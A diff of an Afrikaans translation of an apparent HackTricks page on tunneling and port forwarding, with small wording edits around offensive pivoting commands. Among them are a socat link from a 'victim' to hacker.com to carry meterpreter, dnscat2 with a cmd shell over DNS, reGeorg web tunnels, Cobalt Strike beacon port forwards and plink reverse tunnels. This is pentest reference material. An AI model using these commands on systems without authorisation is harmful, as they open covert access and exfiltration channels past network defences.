@@ -1,4 +1,4 @@
-# Tunneling en Port Forwarding
+# Tunneling en Poort Voorwaartse
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -9,7 +9,7 @@
 
 ## **Bash**
 
-**Gastheer -> Spring -> InternA -> InternB**
+**Gasheer -> Spring -> InternA -> InternB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
+Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Jy kan **tunnel** via **ssh** al die **verkeer** na 'n **subnet** deur 'n gasheer.\
+Jy kan **tunnel** via **ssh** al die **verkeer** na 'n **subnetwerk** deur 'n gasheer.\
 Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, te stuur.
 ```bash
 pip install sshuttle
@@ -145,21 +145,21 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> In hierdie geval is die **poort geopen in die beacon gasheer**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
+> In hierdie geval is die **poort geopen in die beacon-gasheer**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Om op te let:
 
-- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om te relay tussen individuele masjiene nie**.
-- Verkeer word **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
-- **Admin regte is nie nodig** om omgekeerde poort forwards op hoë poorte te skep nie.
+- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om tussen individuele masjiene te relay nie**.
+- Verkeer word **binne Beacon se C2-verkeer getonneld**, insluitend P2P skakels.
+- **Admin regte is nie nodig nie** om omgekeerde poort forwards op hoë poorte te skep.
 
 ### rPort2Port plaaslik
 
 > [!WARNING]
-> In hierdie geval, die **poort word in die beacon gasheer geopen**, nie in die Spanbediener nie en die **verkeer word na die Cobalt Strike kliënt gestuur** (nie na die Spanbediener nie) en van daar na die aangeduide gasheer:poort
+> In hierdie geval, die **poort word in die beacon-gasheer geopen**, nie in die Spanbediener nie en die **verkeer word na die Cobalt Strike-kliënt gestuur** (nie na die Spanbediener nie) en van daar na die aangeduide gasheer:poort
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -168,7 +168,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Jy moet 'n weblêer-tunnel oplaai: ashx|aspx|js|jsp|php|php|jsp
+Jy moet 'n weblêer tonnel oplaai: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -238,7 +238,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Omgekeerde tonnel. Die tonnel word vanaf die slagoffer begin.\
-'n socks4 proxy word op 127.0.0.1:1080 geskep
+'n socks4-proxy word op 127.0.0.1:1080 geskep
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Jy kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
+U kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -322,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Dit is soos 'n konsole PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh kliënt).
 
-Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
+Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort op ons masjien te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -370,7 +370,7 @@ Nou kan jy [**Proxifier**](https://www.proxifier.com/) **gebruik om die verkeer 
 
 Jy kan Windows GUI-apps laat navigeer deur 'n proxy met behulp van [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** voeg die IP en poort van die SOCKS-bediener by.\
-In **Profile -> Proxification Rules** voeg die naam van die program wat geproxied moet word en die verbindings na die IP's wat jy wil proxify by.
+In **Profile -> Proxification Rules** voeg die naam van die program wat geproxify moet word en die verbindings na die IP's wat jy wil proxify by.
 
 ## NTLM proxy bypass
 
@@ -383,8 +383,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgelei word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
-Byvoorbeeld, dit lei poort 443 voort.
+Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, deurgegee word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
+Byvoorbeeld, dit gee die poort 443 deur.
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Nou, as jy byvoorbeeld in die slagoffer die **SSH** diens op poort 443 stel om te luister. Jy kan dit deur die aanvaller se poort 2222 verbind.\
+Nou, as jy byvoorbeeld in die slagoffer die **SSH** diens stel om op poort 443 te luister. Jy kan dit deur die aanvaller se poort 2222 verbind.\
 Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanvaller luister op poort 2222.
 
 ## YARP
@@ -405,7 +405,7 @@ Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanva
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
+Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -435,7 +435,7 @@ Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershel
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Poort deurstuur met dnscat**
+#### **Port forwarding met dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
@@ -455,7 +455,7 @@ Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel met ICMP echo versoeke.
+Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**\
-_&#x45;xposition URI is soos:_ **UID.ngrok.io**
+_Expositie URI is soos:_ **UID.ngrok.io**
 
 ### Installasie
 
